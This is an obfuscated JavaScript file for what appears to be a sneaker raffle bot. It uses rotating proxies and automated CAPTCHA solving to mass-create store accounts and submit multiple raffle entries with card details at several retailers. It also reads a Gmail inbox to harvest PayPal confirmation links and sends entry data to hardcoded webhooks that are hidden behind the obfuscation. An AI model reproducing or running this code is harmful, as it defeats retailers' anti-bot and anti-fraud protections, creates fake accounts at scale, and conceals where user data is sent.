            var _0x28d888 = _0x30cb60()[_0x27a987]['split'](':');
        else
            var _0x49cf4c = Math['round'](Math['random']() * (_0x30cb60()['length'] - 0x1)), _0x28d888 = _0x30cb60()[_0x49cf4c]['split'](':');
        const _0x6da8d = await _0x25d1cc['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x28d888[0x0] + ':' + _0x28d888[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2ae0d7 = await _0x6da8d['newPage']();
            await _0x2ae0d7['authenticate']({
                'username': '' + _0x28d888[0x2],
                'password': '' + _0x28d888[0x3]
            }), console['log'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2ae0d7['setRequestInterception'](!![]), _0x2ae0d7['on']('request', _0x2d6c7e => {
                _0x2d6c7e['resourceType']() === 'image' || _0x2d6c7e['resourceType']() === 'font' || _0x2d6c7e['resourceType']() === 'media' ? _0x2d6c7e['abort']() : _0x2d6c7e['continue']();
            }), await _0x2ae0d7['goto'](_0x3a07f1), await _0x7e80ad(0xbb8), await _0x2ae0d7['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Filling\x20information'), await _0x2ae0d7['type']('#RegisterForm-FirstName', '' + bouncewear[_0x27a987]['FirstName']), await _0x7e80ad(0x226), await _0x2ae0d7['type']('#RegisterForm-LastName', '' + bouncewear[_0x27a987]['LastName']), await _0x7e80ad(0x226), await _0x2ae0d7['type']('#RegisterForm-email', '' + bouncewear[_0x27a987]['Email']), await _0x7e80ad(0x226), await _0x2ae0d7['type']('#RegisterForm-password', '' + bouncewear[_0x27a987]['Password']), await _0x7e80ad(0x226), await _0x2ae0d7['click']('#marketing'), console['log'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Submitting..'), await _0x2ae0d7['$eval']('#RegisterForm', _0x409914 => _0x409914['submit']()), await _0x7e80ad(0x1f40), console['log'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x2ae0d7['solveRecaptchas'](), await _0x2ae0d7['click']('.shopify-challenge__button.btn');
            async function _0x12b92e() {
                for (var _0x2b15c2 = 0x0; _0x2b15c2 < 0x4; _0x2b15c2++) {
                    try {
                        console['log']('try'), await _0x2ae0d7['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20' + _0x1a235e['red']('Catpcha\x20failed,\x20retrying..')), await _0x2ae0d7['solveRecaptchas'](), await _0x2ae0d7['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x12b92e(), console['log'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x7e80ad(0x1f4);
            try {
                await _0x2ae0d7['waitForSelector']('.featured-title'), await _0x7e80ad(0x1f4), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x27a987]['Email'] + '\x20Generated!')), _0x40e0db['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x27a987]['Email'] + ',' + bouncewear[_0x27a987]['Password']), console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x1d3763['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x27a987]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x31ec9d) {
                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x31ec9d));
            }
        } catch (_0x169adf) {
            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20' + _0x169adf));
        } finally {
            _0x6da8d && _0x6da8d['close'](), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
        }
    }
}
async function _0x53fda2(_0x2acc67, _0x43c3d1, _0x2a7423) {
    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x8702f0['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2c492b = 0x0; _0x2c492b < _0x43c3d1['length']; _0x2c492b++) {
        _0x16d703(_0x2acc67['name'] + '\x20Task\x20' + (_0x2c492b + 0x1) + '\x20/\x20' + _0x43c3d1['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
        var _0x57a176 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x397af7
                },
                {
                    'name': 'Product',
                    'value': '' + _0x43c3d1[_0x2c492b]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x43c3d1[_0x2c492b]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x8702f0['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x8702f0['version']
                }
            ]
        }];
        const _0x15d400 = { 'embeds': _0x57a176 };
        await _0x6f470f(_0x43c3d1, _0x2c492b);
        if (_0x43c3d1[_0x2c492b]['Email'] == '' || _0x43c3d1[_0x2c492b]['Password'] == '' || _0x43c3d1[_0x2c492b]['FirstName'] == '' || _0x43c3d1[_0x2c492b]['LastName'] == '') {
            console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x43c3d1[_0x2c492b]['Password'] == '' || _0x43c3d1[_0x2c492b]['Password'] == undefined) && (_0x43c3d1[_0x2c492b]['Password'] = 'ErehsaWonRaj1!');
        if (_0x8702f0['useRandomProxy'] = ![])
            var _0x3efb6d = _0x2a7423[_0x2c492b]['split'](':');
        else
            var _0xab23cd = Math['round'](Math['random']() * (_0x2a7423['length'] - 0x1)), _0x3efb6d = _0x2a7423[_0xab23cd]['split'](':');
        const _0x49b175 = await _0x25d1cc['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3efb6d[0x0] + ':' + _0x3efb6d[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2de1ce = await _0x49b175['newPage']();
            await _0x2de1ce['authenticate']({
                'username': '' + _0x3efb6d[0x2],
                'password': '' + _0x3efb6d[0x3]
            }), console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2de1ce['setRequestInterception'](!![]), _0x2de1ce['on']('request', _0x1f8fa6 => {
                _0x1f8fa6['resourceType']() === 'image' || _0x1f8fa6['resourceType']() === 'font' || _0x1f8fa6['resourceType']() === 'media' ? _0x1f8fa6['abort']() : _0x1f8fa6['continue']();
            }), await _0x2de1ce['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x2de1ce['goto']('' + _0x43c3d1[_0x2c492b]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x2de1ce['waitForSelector']('#btnPdpAtb'), console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x43c3d1[_0x2c492b]['Size']);
            const _0x131364 = await _0x2de1ce['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0xe99cef => {
                return _0xe99cef['map'](_0x254b23 => _0x254b23['innerText']);
            }), _0xb2fe2f = await _0x2de1ce['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x57dfec = ![];
            if (_0x43c3d1[_0x2c492b]['Size'] == 'RANDOM') {
                var _0x1dbe73 = Math['round'](Math['random']() * (_0xb2fe2f['length'] - 0x1));
                await _0xb2fe2f[_0x1dbe73]['click']();
            } else
                for (var _0x2e52b6 = 0x0; _0x2e52b6 < _0x131364['length']; _0x2e52b6++) {
                    if (_0x131364[_0x2e52b6] != _0x43c3d1[_0x2c492b]['Size'])
                        continue;
                    try {
                        await _0xb2fe2f[_0x2e52b6]['click']();
                    } catch {
                        console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x57dfec = !![];
                    }
                }
            if (_0x57dfec)
                continue;
            await _0x7e80ad(0x578), await _0x2de1ce['click']('#btnPdpAtb'), await _0x2de1ce['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x7e80ad(0x3e8), console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x2de1ce['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x2de1ce['waitForSelector']('#email'), await _0x2de1ce['type']('#email', _0x43c3d1[_0x2c492b]['Email']), await _0x7e80ad(0x226), await _0x2de1ce['click']('#guest-submit'), await _0x7e80ad(0x1b58), console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2de1ce['waitForSelector']('#firstname'), await _0x2de1ce['type']('#firstname', _0x43c3d1[_0x2c492b]['FirstName'], 0x1f4), await _0x7e80ad(0x190), await _0x2de1ce['waitForSelector']('#surname'), await _0x2de1ce['type']('#surname', _0x43c3d1[_0x2c492b]['LastName'], 0x1f4), await _0x7e80ad(0x190), await _0x2de1ce['waitForSelector']('#mobile'), await _0x2de1ce['type']('#mobile', _0x43c3d1[_0x2c492b]['Phone'], 0x1f4), await _0x7e80ad(0x190), await _0x2de1ce['click']('#enterManualDiv'), await _0x7e80ad(0x5dc), await _0x2de1ce['waitForSelector']('#address1'), await _0x2de1ce['type']('#address1', _0x43c3d1[_0x2c492b]['Address1'] + '\x20' + _0x43c3d1[_0x2c492b]['HouseNumber'], 0x226), await _0x7e80ad(0x384), await _0x2de1ce['waitForSelector']('#address2'), await _0x2de1ce['type']('#address2', '' + _0x43c3d1[_0x2c492b]['Address2'], 0x226), await _0x7e80ad(0x320);
            const _0x368030 = await _0x2de1ce['$$eval']('#countryselect_view3\x20>\x20option', _0x2ce346 => {
                return _0x2ce346['map'](_0x2e4bf6 => _0x2e4bf6['value']);
            });
            var _0x167015;
            for (var _0x3c0594 = 0x0; _0x3c0594 < _0x368030['length']; _0x3c0594++) {
                if (_0x368030[_0x3c0594]['startsWith']('' + _0x43c3d1[_0x2c492b]['Country'])) {
                    _0x167015 = _0x368030[_0x3c0594];
                    break;
                }
                continue;
            }
            await _0x2de1ce['select']('#countryselect_view3', '' + _0x167015), await _0x2de1ce['waitForSelector']('#address4'), await _0x2de1ce['type']('#address4', '' + _0x43c3d1[_0x2c492b]['City'], 0x1f4), await _0x7e80ad(0x384), await _0x2de1ce['waitForSelector']('#postcode'), await _0x2de1ce['type']('#postcode', '' + _0x43c3d1[_0x2c492b]['Zip'], 0x1f4), await _0x7e80ad(0x4b0);
            const _0x2cb0c3 = await _0x2de1ce['url']();
            console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0xa28151 = _0x2cb0c3['split']('?')[0x1], _0x5517c5 = await _0x2de1ce['$']('#co_address_submit');
            await _0x5517c5['evaluate'](_0x2bb534 => _0x2bb534['click']()), await _0x7e80ad(0x1388), await _0x2de1ce['goto']('https://www.sevenstore.com/checkout/pay/?' + _0xa28151), console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x2de1ce['waitForSelector']('#paymentbuttons'), await _0x7e80ad(0x1388), await _0x2de1ce['click']('#paymentbuttons\x20>\x20div'), await _0x7e80ad(0x1c2), await _0x2de1ce['waitForSelector']('#card-number'), await _0x2de1ce['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x2f164f = await _0x2de1ce['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x89fcc1 = await _0x2f164f['contentFrame']();
            await _0x89fcc1['waitForSelector']('.InputContainer'), await _0x89fcc1['click']('.InputContainer\x20>\x20input'), await _0x7e80ad(0x578), await _0x2de1ce['type']('#card-number', '' + _0x43c3d1[_0x2c492b]['CreditNumber']), await _0x7e80ad(0xfa), await _0x2de1ce['type']('#card-expiry', '' + _0x43c3d1[_0x2c492b]['ExpiryDate']), await _0x7e80ad(0xfa), await _0x2de1ce['type']('#card-cvc', '' + _0x43c3d1[_0x2c492b]['CVV']), await _0x7e80ad(0x7d0), await _0x2de1ce['click']('#card-button'), console['log'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x2de1ce['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x10a0d6(_0x2ae18c, _0x15d400);
            } catch {
                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x203DS\x20Failed')), _0x57a176[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x57a176[0x0]['description'] = '3DS\x20Failed', await _0x10a0d6(_0x5cf6ec, _0x15d400);
            }
        } catch (_0x16cb70) {
            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x2acc67['name'] + ']\x20Task\x20' + (_0x2c492b + 0x1) + '\x20:\x20' + _0x16cb70)), _0x57a176[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x57a176[0x0]['description'] = '' + _0x16cb70, await _0x10a0d6(_0x5cf6ec, _0x15d400);
        } finally {
            _0x49b175 && _0x49b175['close']();
            if (_0x2c492b + 0x1 == _0x43c3d1['length']) {
                console['log'](_0x1a235e['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x7e80ad(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x8702f0['AfewDelay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['AfewDelay']);
        }
    }
}
async function _0x3eee79(_0x45c2b8, _0x215437, _0x4d23fd, _0x1eca12, _0x48899e) {
    var _0x499b3b, _0x1193db = {}, _0x13fbd9 = [], _0x38b436 = {}, _0x61faa8 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x1eca12 && (_0x1eca12 = {});
    if (_0x215437 != 'ver') {
        _0x16d703(_0x4d23fd['name'] + '\x20Task\x20' + (_0x45c2b8 + 0x1) + '\x20/\x20' + _0x1eca12['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x1eca12, _0x45c2b8), _0x13fbd9 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x397af7
                },
                {
                    'name': 'Size',
                    'value': '' + _0x1eca12[_0x45c2b8]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x8702f0['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4a89e9
                }
            ]
        }], _0x38b436 = { 'embeds': _0x13fbd9 }, _0x1193db = _0x4d23fd['data'];
        _0x215437 == 'exp' ? _0x1193db['data']['attributes']['email'] = '' + _0x1eca12[_0x45c2b8]['FirstName'] + _0x1eca12[_0x45c2b8]['LastName'] + _0x8702f0['catchall'] : _0x1193db['data']['attributes']['email'] = '' + _0x1eca12[_0x45c2b8]['Email'];
        if (_0x1eca12[_0x45c2b8]['Size'] == 'RANDOM') {
        }
        _0x1193db['data']['attributes']['properties']['$first_name'] = '' + _0x1eca12[_0x45c2b8]['FirstName'], _0x1193db['data']['attributes']['properties']['$last_name'] = '' + _0x1eca12[_0x45c2b8]['LastName'], _0x1193db['data']['attributes']['properties']['$address1'] = _0x1eca12[_0x45c2b8]['Address1'] + '\x20' + _0x1eca12[_0x45c2b8]['Address2'] + '\x20' + _0x1eca12[_0x45c2b8]['HouseNumber'], _0x1193db['data']['attributes']['properties']['$zip'] = '' + _0x1eca12[_0x45c2b8]['Zip'], _0x1193db['data']['attributes']['properties']['$city'] = '' + _0x1eca12[_0x45c2b8]['City'], _0x1193db['data']['attributes']['properties']['$country'] = '' + _0x1eca12[_0x45c2b8]['Country'], _0x1193db['data']['attributes']['properties']['Size'] = '' + _0x1eca12[_0x45c2b8]['Size'], _0x1193db['data']['attributes']['properties']['$phone_number'] = '' + _0x1eca12[_0x45c2b8]['Phone'], _0x1193db['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x1eca12[_0x45c2b8]['Follower'];
    }
    if (_0x8702f0['useRandomProxy'] = ![])
        var _0x3e07a9 = _0x48899e[_0x45c2b8]['split'](':');
    else
        var _0x2e59ef = Math['round'](Math['random']() * (_0x48899e['length'] - 0x1)), _0x3e07a9 = _0x48899e[_0x2e59ef]['split'](':');
    var _0x47ac62 = {
        'jar': _0x44b991,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x4d23fd['url'],
        'headers': _0x4d23fd['headers'],
        'body': JSON['stringify'](_0x1193db),
        'proxy': 'http://' + _0x3e07a9[0x2] + ':' + _0x3e07a9[0x3] + '@' + _0x3e07a9[0x0] + ':' + _0x3e07a9[0x1]
    };
    return _0x215437 != 'ver' && (_0x47ac62['url'] = _0x4d23fd['url'], _0x47ac62['headers'] = _0x4d23fd['headers']), _0x215437 == 'ver' && (_0x47ac62['method'] = 'GET'), new Promise(function (_0x496998, _0x174f76) {
        callback = async (_0x4cbaac, _0x48db38, _0x5378a9) => {
            if (!_0x4cbaac && _0x48db38['statusCode'] == 0xca || !_0x4cbaac && _0x48db38['statusCode'] == 0xc8) {
                if (_0x215437 != 'ver') {
                    var _0x3451ef = await _0x296449(_0x1eca12[_0x45c2b8], _0x4d23fd, 'dev', ![]), _0x43a34e = await _0x296449(_0x1eca12[_0x45c2b8], _0x4d23fd, 'pub', ![]);
                    const _0x5af786 = {
                        'succesDEVMSG': { 'embeds': [_0x3451ef] },
                        'succesPUBMSG': { 'embeds': [_0x43a34e] }
                    };
                    if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                        try {
                            await _0x10a0d6(_0x8702f0['webhook'], _0x5af786['succesDEVMSG']);
                        } catch {
                        }
                    await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x5af786['succesDEVMSG']), await _0x7e80ad(0xc8);
                    try {
                        await _0x10a0d6(_0x355433, _0x5af786['succesPUBMSG']);
                    } catch {
                    }
                    _0x4bdc1f(_0x1eca12[_0x45c2b8], _0x4d23fd);
                }
                _0x496998(console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x4d23fd['name'] + ']\x20Task\x20' + (_0x45c2b8 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x215437 != 'ver') {
                    var _0x504736 = '' + _0x4cbaac, _0x754253 = await _0x296449(_0x1eca12[_0x45c2b8], _0x4d23fd, 'dev', !![], _0x504736), _0x4e7f31 = {};
                    _0x4e7f31['errorDEV'] = { 'embeds': [_0x754253] }, _0xc1caad(_0x1eca12[_0x45c2b8], _0x4d23fd), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x4e7f31['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x4e7f31['errorDEV']);
                }
                _0x174f76(console['log'](_0x441ea7() + '\x20[' + _0x4d23fd['name'] + ']\x20Task\x20' + (_0x45c2b8 + 0x1) + ':\x20' + _0x4cbaac));
            }
        };
        try {
            _0x215437 != 'ver' && console['log'](_0x441ea7() + '\x20[' + _0x4d23fd['name'] + ']\x20Task\x20' + (_0x45c2b8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1193db['data']['attributes']['email']), _0x394d0f(_0x47ac62, callback);
        } catch (_0xc5e612) {
            console['log'](_0x441ea7() + '\x20Task\x20' + (_0x45c2b8 + 0x1) + ':\x20' + _0xc5e612);
        }
    });
}
;
async function _0x302432(_0x1356ae, _0x295e3a) {
    if (_0x46138c != 'yes')
        var _0x46138c = '', _0x888b1a = 0x0;
    var _0xc484e2 = [];
    async function _0x10d26a() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0x2a2461 = await _0x20a3b0['get']('Quantity')['Quantity'], _0x4aaa82 = new _0x3602ef({
            'user': _0x8702f0['masterMail'],
            'password': _0x8702f0['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x12fede(_0x30124d) {
            _0x4aaa82['openBox']('INBOX', ![], _0x30124d);
        }
        _0x4aaa82['once']('ready', function () {
            _0x12fede(function (_0x14b726, _0xeb701e) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x14b726)
                    throw _0x14b726;
                _0x4aaa82['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x8fa053, _0x186168) {
                    if (!_0x186168 || !_0x186168['length'])
                        console['log'](_0x441ea7() + '\x20[' + _0x1356ae['name'] + ']\x20No\x20mails\x20found'), _0x4aaa82['end']();
                    else {
                        var _0x2bed64 = _0x4aaa82['seq']['fetch'](_0x186168, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x2bed64['on']('message', function (_0x3a5b4c, _0x3ebc27) {
                            var _0x250b1e = '(#' + _0x3ebc27 + ')\x20';
                            _0x3a5b4c['on']('body', function (_0x2a5aa0, _0x55b293) {
                                _0x40c426(_0x2a5aa0, (_0x45cc7c, _0xee8562) => {
                                    if (_0xee8562['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0xee8562['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0xee8562['text']['split']('[')[0x2];
                                        var _0x281347 = mes['split'](']')[0x0];
                                        _0xc484e2['push'](_0x281347);
                                    }
                                });
                            }), _0x3a5b4c['once']('end', function () {
                            });
                        }), _0x2bed64['once']('error', function (_0x20c488) {
                            console['log']('Fetch\x20error:\x20' + _0x20c488);
                        }), _0x2bed64['once']('end', function () {
                            _0x4aaa82['end']();
                        });
                    }
                });
            });
        }), _0x4aaa82['once']('error', function (_0x20f009) {
            console['log'](_0x1a235e['red'](_0x20f009['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x4aaa82['once']('end', async function () {
        }), _0x4aaa82['connect']();
    }
    try {
        _0x10d26a(), await _0x7e80ad(0xfa0), console['log']('Found\x20' + _0xc484e2['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x7e80ad(0xfa0);
    }
    var _0x5a22c0;
    _0x16d703('' + _0x1356ae);
    var _0x2034bd = _0x295e3a[0x0]['split'](':'), _0xa92a07;
    try {
        _0xa92a07 = await _0x25d1cc['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2034bd[0x0] + ':' + _0x2034bd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0xa92a07 = await _0x25d1cc['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2034bd[0x0] + ':' + _0x2034bd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Getting\x20Session');
        const _0x5bb0f9 = await _0xa92a07['newPage']();
        await _0x5bb0f9['authenticate']({
            'username': '' + _0x2034bd[0x2],
            'password': '' + _0x2034bd[0x3]
        }), await _0x5bb0f9['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5bb0f9, await _0x5bb0f9['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5bb0f9['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Successfully\x20logged\x20in'), await _0x7e80ad(0x2710);
        } catch (_0x580ed0) {
            throw new Error('Login\x20session\x20expired\x20' + _0x580ed0);
        }
        for (var _0x7ccbf9 = 0x0; _0x7ccbf9 < _0xc484e2['length']; _0x7ccbf9++) {
            console['log'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Task\x20' + (_0x7ccbf9 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x16d703(_0x1356ae + '\x20Task\x20' + (_0x7ccbf9 + 0x1) + '\x20/\x20' + _0xc484e2['length']);
            const _0x304492 = await _0xa92a07['newPage']();
            await _0x304492['goto']('' + _0xc484e2[_0x7ccbf9], { 'waitUntil': 'networkidle2' }), await _0x7e80ad(0xbb8);
            try {
                const _0x11ec80 = await _0x304492['$']('#challenge-heading');
                _0x11ec80 && (console['log'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Task\x20' + (_0x7ccbf9 + 0x1) + '\x20:\x20' + _0x1a235e['yellow']('2FA\x20Required')), await _0x304492['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x7e80ad(0x9c40), await _0x304492['waitForSelector']('#payment-submit-btn'), await _0x304492['$eval']('#payment-submit-btn', _0x1271b8 => _0x1271b8['click']()), await _0x304492['click']('#payment-submit-btn');
                try {
                    await _0x304492['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x7e80ad(0x5dc), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Task\x20' + (_0x7ccbf9 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x2240b0) {
                    _0x46138c = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x2240b0['message']);
                } finally {
                    if (_0x46138c == 'yes' && _0x888b1a != 0x2) {
                        console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x1356ae['name'] + ']\x20Task\x20' + (_0x7ccbf9 + 0x1) + '\x20:\x20Retrying')), _0x7ccbf9 = _0x7ccbf9 - 0x1, _0x888b1a = _0x888b1a + 0x1;
                        continue;
                    }
                    _0x46138c == 'yes' && _0x888b1a >= 0x2 && (_0xc1caad(csv[_0x7ccbf9], _0x1356ae), _0x46138c = 'no', _0x888b1a = 0x0), await _0x304492['close'](), await _0x7e80ad(0x4650);
                }
            } catch (_0x1e30a2) {
                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x1356ae + ']\x20Task\x20' + (_0x7ccbf9 + 0x1) + '\x20:\x20' + _0x1e30a2));
            }
        }
    } catch (_0x3649d0) {
        console['log'](_0x1a235e['red']('' + _0x3649d0));
    } finally {
        await _0xa92a07['close']();
    }
}
const _0x48b703 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x3eb88b, _0x166816, _0x7101a8) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20eed8 = 0x0; _0x20eed8 < _0x166816['length']; _0x20eed8++) {
                        if (_0x535947 != 'yes')
                            var _0x535947 = '', _0x40f354 = 0x0;
                        var _0x1811cf;
                        await _0x6f470f(_0x166816, _0x20eed8), _0x16d703(_0x3eb88b['name'] + '\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20/\x20' + _0x166816['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
                        var _0x13a7b4 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
